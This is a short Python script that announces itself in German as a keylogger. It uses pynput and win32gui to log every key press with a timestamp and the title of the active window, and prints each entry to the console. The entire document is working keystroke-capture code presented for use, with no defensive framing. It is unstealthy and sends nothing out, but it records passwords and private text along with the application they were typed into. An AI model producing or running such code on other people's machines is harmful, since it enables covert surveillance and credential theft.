from pynput import keyboard
import time
import os
from datetime import datetime

def get_active_window():
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except ImportError:
        return "N/A"

def keyPressed(key):
    active_window = get_active_window()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        char = key.char
        print(f"{timestamp} - Application: {active_window} - Key: {char}")
    except AttributeError:
        print(f"{timestamp} - Application: {active_window} - Key: {key}")

if __name__ == "__main__":
    print("Keylogger gestartet. Das Programm wird im Hintergrund ausgeführt.")
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
    
